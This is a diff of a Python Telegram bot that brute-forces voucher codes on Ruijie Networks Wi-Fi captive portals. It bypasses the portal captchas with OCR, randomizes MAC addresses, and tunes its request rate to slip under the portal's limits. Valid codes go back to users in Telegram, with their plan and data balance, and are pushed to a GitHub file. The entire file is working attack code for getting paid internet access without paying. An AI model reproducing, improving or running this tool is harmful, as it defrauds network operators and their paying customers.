@@ -1,4 +1,4 @@
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, logging, signal, threading
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
@@ -6,6 +6,14 @@ import cv2
 import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
+from typing import Optional, Dict, List, Any
+
+# ── Logging ───────────────────────────────────────────────────────────────
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s [%(levelname)s] %(message)s'
+)
+logger = logging.getLogger(__name__)
 
 # ── Environment variables ─────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
@@ -21,32 +29,36 @@ if not BOT_TOKEN:
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 
-user_data = {}              # {chat_id: {"session_url": ..., "portal_type": ...}}
-scan_tasks = {}             # {chat_id: {"task": asyncio.Task, "stop": bool, "scan_id": str}}
-success_texts = {}          # {chat_id: [{"code": ..., "session_id": ..., "plan": ..., ...}, ...]}
-limited_texts = {}          # {chat_id: [code, ...]}
-captcha_state = {}          # captcha cache per chat_id
+user_data: Dict[int, Dict[str, str]] = {}
+scan_tasks: Dict[int, Dict[str, Any]] = {}
+success_texts: Dict[int, List[Dict[str, Any]]] = {}
+limited_texts: Dict[int, List[str]] = {}
+captcha_state: Dict[str, Dict[str, Any]] = {}  # {cache_key: {session_id, auth_code, ts}}
 
-# Settings
-notify_setting = {}         # {chat_id: True/False}
+notify_setting: Dict[int, bool] = {}
 DEFAULT_NOTIFY = True
-last_scan_params = {}       # {chat_id: {"mode": int, "length": int, "target": int|None, ...}}
-pending_brute = {}          # {chat_id: {...}}
-success_messages = {}
-limited_messages = {}
+last_scan_params: Dict[int, Dict[str, Any]] = {}
+pending_brute: Dict[int, Dict[str, Any]] = {}
+success_messages: Dict[int, int] = {}
+limited_messages: Dict[int, int] = {}
 
-session = None
-_connector = None
-CONCURRENCY = 300           # ⚡ 500 → 300 (optimized for speed & stability)
-BATCH_SIZE = 500            # ⚡ 1000 → 500 (optimized)
-CAPTCHA_RETRY = 5           # ⚡ 8 → 5
-MAX_ATTEMPTS = 2            # ⚡ 3 → 2
-PROGRESS_INTERVAL = 3       # ⚡ Progress update throttle (seconds)
-GITHUB_INTERVAL = 30        # ⚡ 80 → 30 (seconds)
-_voucher_sem = None
+session: Optional[aiohttp.ClientSession] = None
+_connector: Optional[aiohttp.TCPConnector] = None
+
+# ⚡ Ruijie rate limit: 20 req/s → QPS control
+CONCURRENCY = 15              # Concurrent requests (below API limit)
+BATCH_SIZE = 60               # Codes per batch
+SUBMIT_INTERVAL = 0.05        # 50ms between submissions → ~20 QPS
+CAPTCHA_RETRY = 5
+MAX_ATTEMPTS = 2
+PROGRESS_INTERVAL = 3
+GITHUB_INTERVAL = 30
+CAPTCHA_CACHE_TTL = 240       # 4 minutes (Ruijie session ~5 min)
+
+_voucher_sem: Optional[asyncio.Semaphore] = None
 _start_time = time.monotonic()
 
-# ── Portal Configuration ───────────────────────────────────────────────────
+# ── Portal Configuration ──────────────────────────────────────────────────
 PORTAL_CONFIGS = {
     "portal-mm-as": {
         "domain": "portal-mm-as.ruijienetworks.com",
@@ -76,8 +88,8 @@ PORTAL_CONFIGS = {
 
 DEFAULT_PORTAL = "portal-mm-as"
 
-def get_portal_config(session_url=None):
-    """Determine which portal to use based on session URL or default"""
+
+def get_portal_config(session_url: Optional[str] = None):
     if session_url:
         if "portal-mm-as" in session_url:
             return PORTAL_CONFIGS["portal-mm-as"], "portal-mm-as"
@@ -85,9 +97,11 @@ def get_portal_config(session_url=None):
             return PORTAL_CONFIGS["portal-as"], "portal-as"
     return PORTAL_CONFIGS[DEFAULT_PORTAL], DEFAULT_PORTAL
 
+
 # ── Web server (keep alive) ────────────────────────────────────────────────
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
+
 
 async def web_server():
     app = web.Application()
@@ -97,6 +111,8 @@ async def web_server():
     port = int(os.environ.get('BOT_PORT', 8099))
     site = web.TCPSite(runner, '0.0.0.0', port)
     await site.start()
+    logger.info(f"Web server started on port {port}")
+
 
 # ── GitHub helpers ─────────────────────────────────────────────────────────
 async def get_file_content(path):
@@ -108,9 +124,12 @@ async def get_file_content(path):
                 data = await response.json()
                 content = base64.b64decode(data['content']).decode('utf-8')
                 return json.loads(content), data['sha']
+            elif response.status == 404:
+                return {}, None
     except Exception as e:
-        print(f"[get_file_content] error: {e}")
+        logger.error(f"[get_file_content] error: {e}")
     return {}, None
+
 
 async def update_file_content(path, content, sha, message):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
@@ -128,9 +147,9 @@ async def update_file_content(path, content, sha, message):
     async with session.put(url, headers=headers, json=payload) as response:
         return await response.text()
 
+
 # ── Helper functions ───────────────────────────────────────────────────────
 def plan_to_minutes(s):
-    """Parse plan string like '1d', '2h', '30min', '1mo', 'unlimit' → total minutes."""
     if not s:
         return 0
     s = s.strip().lower()
@@ -149,6 +168,7 @@ def plan_to_minutes(s):
             total += val
     return total
 
+
 def _parse_seconds(val):
     secs = int(val)
     hours = secs // 3600
@@ -159,6 +179,7 @@ def _parse_seconds(val):
         return f"{mins}m"
     else:
         return f"{secs}s"
+
 
 def _parse_minutes(val):
     total_mins = int(val)
@@ -178,8 +199,8 @@ def _parse_minutes(val):
     rem_days = days % 30
     return f"{months}mo {rem_days}d" if rem_days else f"{months}mo"
 
+
 def _format_bytes(bytes_val):
-    """Format bytes to human readable GB/MB/KB"""
     try:
         bytes_val = float(bytes_val)
         if bytes_val >= 1024**3:
@@ -193,8 +214,8 @@ def _format_bytes(bytes_val):
     except:
         return "N/A"
 
+
 def _format_quota(used, total=None):
-    """Format quota string like '1.447 MB(307.747 KB↑ / 1.146 MB↓)'"""
     try:
         if isinstance(used, dict):
             up = used.get('up', used.get('upload', 0))
@@ -212,8 +233,8 @@ def _format_quota(used, total=None):
     except:
         return "N/A"
 
+
 async def get_balance(token, portal_config):
-    """Fetch remaining time AND data usage for a given token."""
     url = f"{portal_config['balance_api']}/{token}"
     cookies = {
         'sensorsdata2015jssdkcross': '%7B%22distinct_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllNDYwZWY0NDQ1MDctMDkxZWY5MGMwMjg3NDUtMWU0NjJjNmUtMzQzMDg5LTE5ZTQ2MGVmNDQ1MmFiIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e460ef444507-091ef90c028745-1e462c6e-343089-19e460ef4452ab%22%7D',
@@ -248,13 +269,7 @@ async def get_balance(token, portal_config):
             except Exception:
                 return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
 
-            result = {
-                "time": "N/A",
-                "usage": "N/A",
-                "quota": "N/A",
-                "plan": "N/A",
-                "expire": "N/A"
-            }
+            result = {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
 
             candidates = [data]
             for nested_key in ['result', 'data']:
@@ -301,13 +316,11 @@ async def get_balance(token, portal_config):
 
             return result
     except Exception as e:
-        print(f"[get_balance] error for {token}: {e}")
+        logger.error(f"[get_balance] error for {token}: {e}")
         return {"time": "N/A", "usage": "N/A", "quota": "N/A", "plan": "N/A", "expire": "N/A"}
 
+
 def iter_codes(mode, length):
-    """
-    mode: 1=digits, 2=lowercase, 3=uppercase, 4=mixed case, 5=alphanumeric
-    """
     if mode == 1:
         chars = string.digits
     elif mode == 2:
@@ -324,41 +337,62 @@ def iter_codes(mode, length):
     while True:
         yield "".join(random.choice(chars) for _ in range(length))
 
-def format_progress(checked, total=None, speed=0, found=0, target=None):
+
+def format_progress(checked, total=None, speed=0, found=0, target=None, retry=0):
     lines = [
         "📋 Status: Running",
         f"⚡ Speed: {speed:,.0f}/min",
         f"🔍 Checked: {checked:,}",
         f"💎 Found: {found}",
     ]
+    if retry:
+        lines.append(f"🔄 Retry Queue: {retry}")
     if target:
         lines.append(f"🎯 Target: {found}/{target}")
     return "\n".join(lines)
 
-# ── Captcha handling ──────────────────────────────────────────────────────
-_ocr = ddddocr.DdddOcr(show_ad=False)
+
+# ── Captcha handling (thread-safe) ────────────────────────────────────────
+_ocr_local = threading.local()
+
+
+def _get_ocr():
+    """Thread-local OCR instance (ddddocr is NOT thread-safe)."""
+    if not hasattr(_ocr_local, 'ocr'):
+        _ocr_local.ocr = ddddocr.DdddOcr(show_ad=False)
+    return _ocr_local.ocr
+
 
 def _ocr_sync(image_bytes):
-    nparr = np.frombuffer(image_bytes, np.uint8)
-    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-    if img is None:
+    try:
+        ocr = _get_ocr()
+        nparr = np.frombuffer(image_bytes, np.uint8)
+        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+        if img is None:
+            return None
+        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+        _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+        _, buffer = cv2.imencode('.png', thresh)
+        result = ocr.classification(buffer.tobytes())
+        return result.upper()
+    except Exception as e:
+        logger.error(f"[_ocr_sync] error: {e}")
         return None
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    _, buffer = cv2.imencode('.png', thresh)
-    result = _ocr.classification(buffer.tobytes())
-    return result.upper()
+
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
+
 
 def get_mac():
     first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
     return ':'.join(f'{x:02x}' for x in mac)
 
+
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
+
 
 async def get_session_id(session_obj, session_url, previous_session_id=None):
     mac = get_mac()
@@ -376,15 +410,16 @@ async def get_session_id(session_obj, session_url, previous_session_id=None):
         'sec-fetch-site': 'same-origin',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
-        'cookie': 'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
     }
     try:
         async with session_obj.get(url, headers=headers, allow_redirects=True) as req:
             response = str(req.url)
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
             return sid.group(1) if sid else previous_session_id
-    except:
+    except Exception as e:
+        logger.error(f"[get_session_id] error: {e}")
         return previous_session_id
+
 
 async def Captcha_Image(session_obj, session_id, portal_config):
     headers = {
@@ -403,6 +438,7 @@ async def Captcha_Image(session_obj, session_id, portal_config):
     params = {'sessionId': session_id, '_t': str(time.time())}
     async with session_obj.get(portal_config['captcha_image_api'], params=params, headers=headers) as req:
         return await req.read()
+
 
 async def Varify_Captcha(session_obj, session_id, text, portal_config):
     headers = {
@@ -425,19 +461,13 @@ async def Varify_Captcha(session_obj, session_id, text, portal_config):
         data = await req.json()
         return session_id if data.get("success") == True else None
 
+
 async def check_session_url(session_url):
     headers = {
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9',
         'priority': 'u=0, i',
         'referer': session_url,
-        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
     }
     try:
@@ -446,33 +476,26 @@ async def check_session_url(session_url):
     except:
         return False
 
-# ── Core voucher check (OPTIMIZED) ────────────────────────────────────────
-async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None, plan_filters=None):
-    global _connector
-    if not recheck:
-        current_task = scan_tasks.get(chat_id)
-        if not current_task or current_task.get("scan_id") != scan_id:
-            return
 
-    portal_config, portal_name = get_portal_config(session_url)
-    post_url = portal_config['voucher_api']
-
-    response = None
-    session_id = None
-
+# ── Session + Captcha acquisition (reusable) ──────────────────────────────
+async def acquire_session_and_captcha(session_url: str, portal_config: dict) -> Optional[Dict[str, Any]]:
+    """
+    Acquire a reusable session_id + verified authCode.
+    Returns dict {session, session_id, auth_code} or None.
+    """
     for attempt in range(MAX_ATTEMPTS):
-        timeout = aiohttp.ClientTimeout(total=20)
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=timeout
-        ) as task_session:
+        try:
+            task_session = aiohttp.ClientSession(
+                connector=_connector,
+                connector_owner=False,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=aiohttp.ClientTimeout(total=25)
+            )
             session_id = await get_session_id(task_session, session_url)
             if not session_id:
+                await task_session.close()
                 continue
 
-            auth_code = None
             for _ in range(CAPTCHA_RETRY):
                 try:
                     image = await Captcha_Image(task_session, session_id, portal_config)
@@ -480,61 +503,149 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     if not text:
                         continue
                     if await Varify_Captcha(task_session, session_id, text, portal_config):
-                        auth_code = text
-                        break
-                except:
+                        return {
+                            "session": task_session,
+                            "session_id": session_id,
+                            "auth_code": text,
+                            "ts": time.time()
+                        }
+                except Exception as e:
+                    logger.debug(f"[acquire] captcha retry error: {e}")
                     continue
-            if not auth_code:
-                continue
 
-            if not recheck:
-                current_task = scan_tasks.get(chat_id)
-                if not current_task or current_task.get("scan_id") != scan_id or current_task.get("stop"):
-                    return
+            await task_session.close()
+        except Exception as e:
+            logger.error(f"[acquire_session_and_captcha] attempt {attempt+1}: {e}")
 
-            data = {
-                "accessCode": code,
-                "sessionId": session_id,
-                "apiVersion": 1,
-                "authCode": auth_code,
-            }
-            headers = {
-                "authority": portal_config['domain'],
-                "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
-                "content-type": "application/json",
-                "origin": portal_config['base_url'],
-                "referer": portal_config['referer_index'] + session_id,
-                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
-                "sec-ch-ua-mobile": "?1",
-                "sec-ch-ua-platform": '"Android"',
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "same-origin",
-                "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
-            }
-            try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
-                    response = await req.text()
-                    resp_json = json.loads(response)
-                    print(f"[voucher] code={code} attempt={attempt+1} status={req.status}")
-            except Exception as e:
-                print(f"[perform_check] network error: {e}")
-                continue  # ⚡ retry on network error
+    return None
 
-        if response and 'request limited' in response:
-            wait = min(2 ** attempt, 6)
-            print(f"[perform_check] rate limited, waiting {wait}s (attempt {attempt+1}/{MAX_ATTEMPTS})")
-            await asyncio.sleep(wait)
-            continue
-        break
+
+def _cache_get(cache_key: str) -> Optional[Dict[str, Any]]:
+    """Get cached session+captcha if not expired."""
+    cached = captcha_state.get(cache_key)
+    if cached and (time.time() - cached.get("ts", 0)) < CAPTCHA_CACHE_TTL:
+        return cached
+    return None
+
+
+def _cache_clear(cache_key: str):
+    cached = captcha_state.pop(cache_key, None)
+    if cached and cached.get("session"):
+        try:
+            asyncio.create_task(cached["session"].close())
+        except:
+            pass
+
+
+# ── Core voucher check ────────────────────────────────────────────────────
+async def perform_check(
+    session_url: str,
+    code: str,
+    chat_id: int,
+    scan_id: Optional[str] = None,
+    recheck: bool = False,
+    message: Any = None,
+    plan_filters: Optional[List[str]] = None,
+    shared_session: Optional[aiohttp.ClientSession] = None,
+    shared_session_id: Optional[str] = None,
+    shared_auth_code: Optional[str] = None,
+) -> Optional[Dict[str, Any]]:
+    """
+    Returns:
+      - None: not found / skipped
+      - {"status": "success", "code": ...}
+      - {"status": "limited", "code": ...}
+      - {"status": "rate_limited", "code": ...}  → should retry
+      - {"status": "error", "code": ...}
+    """
+    if not recheck:
+        current_task = scan_tasks.get(chat_id)
+        if not current_task or current_task.get("scan_id") != scan_id:
+            return None
+
+    portal_config, portal_name = get_portal_config(session_url)
+    post_url = portal_config['voucher_api']
+
+    # Use shared session/captcha if provided (batch mode)
+    task_session = shared_session
+    session_id = shared_session_id
+    auth_code = shared_auth_code
+
+    if not task_session or not session_id or not auth_code:
+        # Fallback: acquire per-code session
+        acquired = await acquire_session_and_captcha(session_url, portal_config)
+        if not acquired:
+            return {"status": "error", "code": code}
+        task_session = acquired["session"]
+        session_id = acquired["session_id"]
+        auth_code = acquired["auth_code"]
+
+    data = {
+        "accessCode": code,
+        "sessionId": session_id,
+        "apiVersion": 1,
+        "authCode": auth_code,
+    }
+    headers = {
+        "authority": portal_config['domain'],
+        "accept": "*/*",
+        "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "origin": portal_config['base_url'],
+        "referer": portal_config['referer_index'] + session_id,
+        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
+        "sec-ch-ua-mobile": "?1",
+        "sec-ch-ua-platform": '"Android"',
+        "sec-fetch-dest": "empty",
+        "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-origin",
+        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+    }
+
+    response = None
+    try:
+        async with task_session.post(post_url, json=data, headers=headers) as req:
+            response = await req.text()
+            logger.debug(f"[voucher] code={code} status={req.status} body={response[:200]}")
+    except Exception as e:
+        logger.error(f"[perform_check] network error for {code}: {e}")
+        return {"status": "error", "code": code}
 
     if not response:
-        return
+        return {"status": "error", "code": code}
 
+    # ── Response classification ───────────────────────────────────────────
+    resp_lower = response.lower()
+
+    # Ruijie rate limit → should retry
+    if 'request limited' in resp_lower or 'too many' in resp_lower:
+        return {"status": "rate_limited", "code": code}
+
+    # Voucher already used / flow limit
+    if 'STA' in response:
+        if chat_id not in limited_texts:
+            limited_texts[chat_id] = []
+        limited_texts[chat_id].append(code)
+        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
+            limited_line = "\n".join(limited_texts[chat_id])
+            try:
+                if chat_id not in limited_messages:
+                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
+                    limited_messages[chat_id] = sent.message_id
+                else:
+                    await bot.edit_message_text(
+                        chat_id=chat_id,
+                        message_id=limited_messages[chat_id],
+                        text=f"⚠️ Limited Codes:\n{limited_line}"
+                    )
+            except:
+                pass
+        return {"status": "limited", "code": code}
+
+    # Success!
     if 'logonUrl' in response:
         if recheck:
-            return code
+            return {"status": "success", "code": code}
 
         plan_str = "N/A"
         usage_str = "N/A"
@@ -556,8 +667,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 usage_str = balance_info.get("usage", "N/A")
                 quota_str = balance_info.get("quota", "N/A")
                 expire_str = balance_info.get("expire", "N/A")
-        except Exception:
-            pass
+        except Exception as e:
+            logger.error(f"[balance] error: {e}")
 
         if plan_filters:
             code_mins = plan_to_minutes(plan_str)
@@ -611,38 +722,35 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     )
             except:
                 pass
-        return code
+        return {"status": "success", "code": code}
 
-    elif 'STA' in response:
-        if chat_id not in limited_texts:
-            limited_texts[chat_id] = []
-        limited_texts[chat_id].append(code)
-        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
-            limited_line = "\n".join(limited_texts[chat_id])
-            try:
-                if chat_id not in limited_messages:
-                    sent = await bot.send_message(chat_id, f"⚠️ Limited Codes:\n{limited_line}")
-                    limited_messages[chat_id] = sent.message_id
-                else:
-                    await bot.edit_message_text(
-                        chat_id=chat_id,
-                        message_id=limited_messages[chat_id],
-                        text=f"⚠️ Limited Codes:\n{limited_line}"
-                    )
-            except:
-                pass
+    # Unknown response
+    return None
 
-# ── Brute-force runner (OPTIMIZED) ────────────────────────────────────────
-async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=None, message=None, progress_msg=None, plan_filters=None):
+
+# ── Brute-force runner (optimized) ────────────────────────────────────────
+async def run_bruteforce(
+    mode: int,
+    length: int,
+    chat_id: int,
+    session_url: str,
+    scan_id: str,
+    target: Optional[int] = None,
+    message: Any = None,
+    progress_msg: Any = None,
+    plan_filters: Optional[List[str]] = None,
+):
     try:
         code_iter = iter_codes(mode, length)
     except ValueError as e:
         await bot.send_message(chat_id, str(e))
         return
 
-    total = None
+    portal_config, _ = get_portal_config(session_url)
+
     checked = 0
     found = 0
+    retry_queue: List[str] = []
     scan_start = time.monotonic()
     last_progress_update = 0
 
@@ -650,47 +758,109 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
     if _voucher_sem is None:
         _voucher_sem = asyncio.Semaphore(CONCURRENCY)
 
+    cache_key = f"{chat_id}_{scan_id}"
+
     try:
         while True:
+            # Check stop signal
             current_task = scan_tasks.get(chat_id)
             if not current_task or current_task.get("scan_id") != scan_id:
                 return
             if current_task.get("stop"):
-                last_scan_params[chat_id] = {"mode": mode, "length": length, "target": target, "plan_filters": plan_filters or []}
-                scan_tasks.pop(chat_id, None)
+                last_scan_params[chat_id] = {
+                    "mode": mode, "length": length, "target": target,
+                    "plan_filters": plan_filters or []
+                }
                 return
 
-            # ⚡ Batch size optimized
-            batch = []
-            for _ in range(BATCH_SIZE):
+            # ── Acquire shared session + captcha (reusable) ───────────────
+            cached = _cache_get(cache_key)
+            if cached and cached.get("session") and not cached["session"].closed:
+                shared_session = cached["session"]
+                shared_session_id = cached["session_id"]
+                shared_auth_code = cached["auth_code"]
+            else:
+                _cache_clear(cache_key)
+                acquired = await acquire_session_and_captcha(session_url, portal_config)
+                if not acquired:
+                    logger.warning("[run_bruteforce] failed to acquire session, retrying in 3s")
+                    await asyncio.sleep(3)
+                    continue
+                captcha_state[cache_key] = acquired
+                shared_session = acquired["session"]
+                shared_session_id = acquired["session_id"]
+                shared_auth_code = acquired["auth_code"]
+
+            # ── Build batch (retry queue first) ──────────────────────────
+            batch = retry_queue[:BATCH_SIZE]
+            retry_queue = retry_queue[BATCH_SIZE:]
+            while len(batch) < BATCH_SIZE:
                 batch.append(next(code_iter))
 
-            async def _check(code):
+            # ── Submit with QPS control ──────────────────────────────────
+            async def _check(code, index):
+                await asyncio.sleep(index * SUBMIT_INTERVAL)
                 async with _voucher_sem:
                     return await perform_check(
                         session_url, code, chat_id, scan_id, message=message,
-                        plan_filters=plan_filters
+                        plan_filters=plan_filters,
+                        shared_session=shared_session,
+                        shared_session_id=shared_session_id,
+                        shared_auth_code=shared_auth_code,
                     )
 
-            results = await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
+            # Submit in chunks of 20 to respect rate limit
+            all_results = []
+            for chunk_start in range(0, len(batch), 20):
+                chunk = batch[chunk_start:chunk_start + 20]
+                chunk_results = await asyncio.gather(
+                    *[_check(code, i) for i, code in enumerate(chunk)],
+                    return_exceptions=True
+                )
+                all_results.extend(chunk_results)
+                # Throttle between chunks
+                await asyncio.sleep(0.5)
 
-            for res in results:
-                if res:
+            # ── Process results ──────────────────────────────────────────
+            rate_limited_count = 0
+            for res in all_results:
+                if isinstance(res, Exception):
+                    checked += 1
+                    continue
+                if not isinstance(res, dict):
+                    checked += 1
+                    continue
+
+                status = res.get("status")
+                if status == "success":
                     found += 1
+                    checked += 1
                     if target and found >= target:
                         await progress_msg.edit_text("🎯 Target reached!")
-                        scan_tasks.pop(chat_id, None)
                         last_scan_params.pop(chat_id, None)
                         return
+                elif status == "limited":
+                    checked += 1
+                elif status == "rate_limited":
+                    retry_queue.append(res["code"])
+                    rate_limited_count += 1
+                elif status == "error":
+                    retry_queue.append(res["code"])
+                else:
+                    checked += 1
 
-            checked += len(batch)
+            # If rate limited too much, refresh session + slow down
+            if rate_limited_count > len(batch) * 0.3:
+                logger.warning(f"[run_bruteforce] high rate limit ratio ({rate_limited_count}/{len(batch)}), refreshing session")
+                _cache_clear(cache_key)
+                await asyncio.sleep(3)
+
+            # ── Progress update ──────────────────────────────────────────
             elapsed = time.monotonic() - scan_start
             speed = (checked / elapsed * 60) if elapsed > 0 else 0
-
-            # ⚡ Progress update throttle (every 3 seconds)
             now = time.monotonic()
             if now - last_progress_update >= PROGRESS_INTERVAL:
-                text = format_progress(checked, total, speed, found, target)
+                text = format_progress(checked, None, speed, found, target, len(retry_queue))
                 try:
                     await bot.edit_message_text(
                         chat_id=chat_id,
@@ -704,10 +874,13 @@ async def run_bruteforce(mode, length, chat_id, session_url, scan_id, target=Non
                     except:
                         pass
                 last_progress_update = now
+
     finally:
+        _cache_clear(cache_key)
         scan_tasks.pop(chat_id, None)
 
-# ── GitHub update scheduler (OPTIMIZED) ───────────────────────────────────
+
+# ── GitHub update scheduler (with re-queue on error) ──────────────────────
 async def github_update_scheduler():
     global SUCCESS_CODE
     while True:
@@ -715,37 +888,45 @@ async def github_update_scheduler():
         items = []
         while not SUCCESS_CODE.empty():
             items.append(await SUCCESS_CODE.get())
-        if items:
-            try:
-                results, sha = await get_file_content("result.json")
-                for item in items:
-                    chat_id = str(item["chat_id"])
-                    code = item["code"]
-                    if chat_id not in results:
-                        results[chat_id] = []
-                    if code not in results[chat_id]:
-                        results[chat_id].append({
-                            "code": code,
-                            "plan": item.get("plan", "N/A"),
-                            "usage": item.get("usage", "N/A"),
-                            "quota": item.get("quota", "N/A")
-                        })
-                await update_file_content("result.json", results, sha, "Periodic Update")
-            except Exception as e:
-                print(f"Update Error: {e}")
+
+        if not items:
+            continue
+
+        try:
+            results, sha = await get_file_content("result.json")
+            for item in items:
+                chat_id = str(item["chat_id"])
+                code = item["code"]
+                if chat_id not in results:
+                    results[chat_id] = []
+                if code not in results[chat_id]:
+                    results[chat_id].append({
+                        "code": code,
+                        "plan": item.get("plan", "N/A"),
+                        "usage": item.get("usage", "N/A"),
+                        "quota": item.get("quota", "N/A")
+                    })
+            await update_file_content("result.json", results, sha, "Periodic Update")
+            logger.info(f"[github] updated {len(items)} items")
+        except Exception as e:
+            logger.error(f"[github] Update Error: {e}. Re-queuing {len(items)} items.")
+            # ⚡ Re-queue to prevent data loss
+            for item in items:
+                await SUCCESS_CODE.put(item)
+
 
 # ── Bot commands ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['start'])
 async def start(message):
     await bot.reply_to(message, "Bot စတင်ပါပြီ။ /help ဖြင့် အသုံးပြုနည်းကြည့်ပါ။")
 
+
 @bot.message_handler(commands=['help'])
 async def help_cmd(message):
     help_text = (
         "📚 **Command လမ်းညွှန်**\n\n"
         "၁။ **Setup**:\n"
-        "   /setup <url>\n"
-        "   (portal-mm-as သို့မဟုတ် portal-as URL)\n\n"
+        "   /setup <url>\n\n"
         "၂။ **ရှာဖွေခြင်း**:\n"
         "   /brute <mode> <length> [target]\n"
         "   Mode:\n"
@@ -753,29 +934,30 @@ async def help_cmd(message):
         "     2 = အင်္ဂလိပ်စာလုံးအသေး (a-z)\n"
         "     3 = အင်္ဂလိပ်စာလုံးအကြီး (A-Z)\n"
         "     4 = စာလုံးအကြီး+အသေး (a-zA-Z)\n"
-        "     5 = စာလုံး+ဂဏန်း (a-z, 0-9)\n"
-        "   ဥပမာ: /brute 1 6 5\n\n"
-        "၃။ /status  – အခြေအနေကြည့်\n"
-        "၄။ /stop    – ရပ်တန့်ခြင်း\n"
